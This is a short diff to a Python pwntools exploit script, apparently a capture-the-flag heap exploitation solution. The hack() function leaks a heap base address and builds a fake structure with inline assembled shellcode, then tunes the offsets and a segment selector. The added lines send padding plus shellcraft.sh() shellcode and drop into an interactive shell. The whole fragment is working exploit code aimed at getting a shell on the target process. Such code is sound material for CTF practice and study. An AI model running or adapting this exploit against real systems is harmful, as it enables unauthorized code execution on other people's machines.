@@ -49,11 +49,11 @@ def hack():
     heap_base = int(rv(14),16) - 0x21000
     lg('heap_base',heap_base)
     data = [0]*0x10
-    data[0] = u64(asm('push rsp;pop rsi;xor rdx,rdx;syscall').ljust(8,'\x90'))
-    data[2] = 0x200
-    data[5] = heap_base + 0x8
+    data[0] = u64(asm('push rsp;pop rsi;xor rdi,rdi;syscall').ljust(8,'\x90'))
+    data[2] = 0x300
+    data[5] = heap_base + 0x240
     data[6] = heap_base + 0x290
-    data[8] = 0x002b00000000003b
+    data[8] = 0x002b000000000033
     #for i in range(0x7f):
     #    payload += chr(i)
     payload = flat(data)[:0x7f]
@@ -61,5 +61,8 @@ def hack():
     #raw_input()
     execute(12,'0')
     execute(15,'0')
+
+    payload = '\x00'*0x57 + asm(shellcraft.sh())
+    sl(payload)
     p.interactive()
 hack()
